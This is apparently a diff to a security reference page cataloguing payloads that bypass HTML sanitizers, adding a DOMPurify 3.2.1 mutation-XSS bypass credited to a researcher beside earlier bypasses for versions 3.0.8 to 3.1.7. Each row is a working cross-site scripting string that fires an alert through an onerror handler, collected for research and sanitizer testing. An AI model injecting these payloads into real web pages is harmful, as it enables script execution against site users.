@@ -17,6 +17,7 @@ This page contains some examples of payloads used to bypass sanitizers in the pa
 | 3.0.8   | `<svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">`                              | Kévin - Mizu [@kevin_mizu](https://twitter.com/kevin_mizu) | <https://mizu.re/post/playing-with-dompurify-ce-handling> |
 | 3.1.0   | ```n = 506; var payload = `${"<div>".repeat(n)}<table id="outer"><caption id="outer"><svg><desc><table id="inner"><caption id="inner"></caption></table></desc><style><a title="</style><img src onerror=alert(1)>"></a></style></svg></caption></table>${"</div>".repeat(n)}`;``` | [icesfont](https://github.com/icesfont) | N/A |
 | 3.1.7   | `<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=alert(1)>">.` | Masato Kinugawa [@kinugawamasato](https://twitter.com/kinugawamasato) | <https://x.com/kinugawamasato/status/1843687909431582830> |
+| 3.2.1   | `<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<a><style><!--</style>a<foo-bar is="--><img src=x onerror=alert(1)>">` | Yaniv Nizry [@YNizry](https://twitter.com/YNizry) | <https://yaniv-git.github.io/2024/12/08/DOMPurify%203.2.1%20Bypass%20(Non-Default%20Config)/> |
 
 ## Mozilla Bleach
 
